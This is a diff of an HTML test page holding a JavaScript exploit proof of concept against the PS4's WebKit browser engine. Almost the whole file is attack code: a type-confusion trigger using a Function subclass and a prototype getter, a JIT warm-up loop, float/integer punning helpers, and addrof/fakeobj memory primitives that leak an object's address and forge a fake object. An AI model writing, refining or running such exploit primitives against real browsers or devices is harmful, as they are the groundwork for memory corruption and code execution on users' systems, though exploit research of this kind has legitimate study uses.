@@ -1,19 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>PsPEE v1.5 — Real DataView R/W</title>
-  <style>
-    body { background: black; color: lime; font-family: monospace; }
-    #log { white-space: pre-wrap; padding: 1em; }
-  </style>
+    <title>PS4 WebKit Exploit Test</title>
 </head>
 <body>
-  <div id="log"></div>
-  <script>
+<script>
 // === PS4 WebKit exploit: Type confusion primitive using MyFunction PoC ===
 
-// 1. Exploit class based on your PoC
+// 1. Exploit class from your PoC
 class MyFunction extends Function {
     constructor() {
         super();
@@ -21,7 +15,7 @@ class MyFunction extends Function {
     }
 }
 
-// 2. Core confusion function based on your original PoC behavior
+// 2. Trigger confusion after invalid prototype overwrite
 function confuse(arr, f) {
     try {
         f.__defineGetter__("prototype", () => {});
@@ -30,16 +24,11 @@ function confuse(arr, f) {
     return arr[0];
 }
 
-// 3. Arrays for spraying floats and objects
+// 3. Float/object arrays
 const float_arr = [1.1, 2.2, 3.3];
 const obj_arr   = [{}, {}, {}];
 
-// 4. JIT warm-up
-for (let i = 0; i < 10000; i++) {
-    confuse(float_arr, new MyFunction());
-}
-
-// 5. Conversion helpers (float <-> int)
+// 4. Type punning (float/int conversions)
 const buf = new ArrayBuffer(16);
 const f64 = new Float64Array(buf);
 const u32 = new Uint32Array(buf);
@@ -54,30 +43,37 @@ function i2f(i) {
     return f64[0];
 }
 
-// 6. Leak object address
+// 5. Leak address of a JS object
 function addrof(obj) {
     obj_arr[0] = obj;
-    let leaked = confuse(float_arr, new MyFunction());
-    return f2i(leaked);
+    let leak = confuse(float_arr, new MyFunction());
+    return f2i(leak);
 }
 
-// 7. Craft fake JS object from address
+// 6. Create fake JS object at controlled address
 function fakeobj(addr) {
     float_arr[0] = i2f(addr);
     return confuse(obj_arr, new MyFunction());
 }
 
-// 8. Test
-(function () {
-    let test = {pwned: 0x1337};
-    let addr = addrof(test);
-    alert("addrof(test) = 0x" + addr.toString(16));
+// 7. Warm up JIT with float-only access pattern
+for (let i = 0; i < 10000; i++) {
+    confuse(float_arr, new MyFunction());
+}
 
-    let fake = fakeobj(addr);
-    alert("fake.pwned = 0x" + fake.pwned.toString(16));
-})();
+// 8. Run exploit logic
+setTimeout(() => {
+    try {
+        let obj = { marker: 0x41424344 };
+        let addr = addrof(obj);
+        alert("[+] Leaked object address: 0x" + addr.toString(16));
 
-
-  </script>
+        let fake = fakeobj(addr);
+        alert("[+] fake.marker = 0x" + fake.marker.toString(16));
+    } catch (e) {
+        alert("[-] Exploit failed: " + e);
+    }
+}, 100);
+</script>
 </body>
 </html>
